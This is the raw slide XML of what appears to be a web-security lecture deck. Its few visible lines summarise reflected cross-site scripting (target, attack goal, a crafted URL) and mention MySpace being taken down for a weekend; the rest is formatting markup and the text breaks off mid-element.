            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>20</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="-40" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>hours</a:t>
            </a:r>
            <a:endParaRPr sz="2294" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="object 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2334679" y="5720604"/>
            <a:ext cx="131669" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="260" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="object 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2531319" y="5635475"/>
            <a:ext cx="5266765" cy="353045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2294" spc="-93" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Took </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="35" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>down </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>MySpace </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>for </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>weekend</a:t>
            </a:r>
            <a:endParaRPr sz="2294" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167953" name="object 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8516470" y="4639235"/>
            <a:ext cx="1949824" cy="1949824"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42904410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Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2339228" y="717177"/>
            <a:ext cx="7513544" cy="691963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-GB" altLang="en-US">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169987" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2602566" y="2291603"/>
            <a:ext cx="6986868" cy="366575"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" numCol="1" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0"/>
            <a:endParaRPr lang="en-GB" altLang="en-US">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16998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27412" y="537882"/>
            <a:ext cx="8408614" cy="584947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97242340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39228" y="717176"/>
            <a:ext cx="7513544" cy="828368"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="13983" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="5383" spc="40" dirty="0"/>
              <a:t>Reflected </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-291" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-62" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="5383" spc="-18" dirty="0"/>
              <a:t>Summary</a:t>
            </a:r>
            <a:endParaRPr sz="5383"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="2074489"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177156" name="object 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2599765" y="2032468"/>
            <a:ext cx="7020485" cy="9485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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="just" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="97000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Target</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: User with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" i="1">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Javascript-enabled browser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>; vulnerable  web service that includes parts of URLs it receives in the  output it generates</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="3357563"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177158" name="object 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2599765" y="3335151"/>
            <a:ext cx="7230596" cy="641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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="2471"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Attack goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: Run script in user’s browser with same access  as provided to server’s regular scripts (subvert SOP)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="4318467"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599765" y="4263839"/>
            <a:ext cx="7224993" cy="325923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" spc="13" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Attacker </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="18" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>needs</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="18" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Get </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>user </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="44" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>click </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>on </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="26" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>specially-crafted</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-53" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-31" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>URL.</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="4754095"/>
            <a:ext cx="126066" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
